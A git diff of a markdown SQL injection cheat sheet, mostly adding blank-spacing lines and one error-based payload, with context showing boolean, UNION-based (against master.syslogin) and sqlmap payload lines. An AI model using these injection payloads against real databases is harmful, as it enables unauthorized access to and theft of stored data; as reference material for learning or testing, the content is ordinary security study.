@@ -29,7 +29,10 @@ __Basic Payloads___
     
     
 
-
+&nbsp; 
+ &nbsp; 
+ &nbsp; 
+   
 ### Blind SQL : 
 
 This type of SQL injection is based on booleans : True or False .
@@ -46,7 +49,10 @@ This type of SQL injection is based on booleans : True or False .
 Automate the process of SQL blind
 >> script 
 
-
+&nbsp; 
+ &nbsp; 
+ &nbsp; 
+   
 ### Band SQL:
 
 - ' and 'a'='a
@@ -55,7 +61,15 @@ Automate the process of SQL blind
 
 - 9999' UNION SELECT name,222,'else1' FROM master.syslogin; --
 
+### Error based SQL:
 
+- 1 or db_name()=1);
+
+ 
+ &nbsp; 
+ &nbsp; 
+ &nbsp; 
+   
 ### SQLmap:
 
 - sqlmap  &nbsp; -u URL  &nbsp; -p search  &nbsp; --technique=U |  &nbsp; U for Union Selection
